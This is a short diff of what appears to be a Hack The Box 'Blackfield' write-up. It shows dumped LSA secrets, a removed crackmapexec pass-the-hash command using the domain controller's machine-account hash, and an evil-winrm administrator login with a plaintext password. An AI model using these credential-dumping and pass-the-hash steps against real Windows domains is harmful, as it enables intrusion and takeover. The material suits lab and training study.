@@ -161,11 +161,6 @@ dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
 NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
 ..SNIPPED..
 
-# Valid credentials
-$ crackmapexec smb blackfield.local -u DC01$ -H 651aa7b2a5b485164c9b04a41a6b70dc
-SMB         blackfield.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
-SMB         blackfield.htb  445    DC01             [+] BLACKFIELD.local\DC01$:651aa7b2a5b485164c9b04a41a6b70dc
-
 # Login as admin
 $ evil-winrm -i 10.129.229.17 -u administrator -p '###_ADM1N_3920_###'
                                         
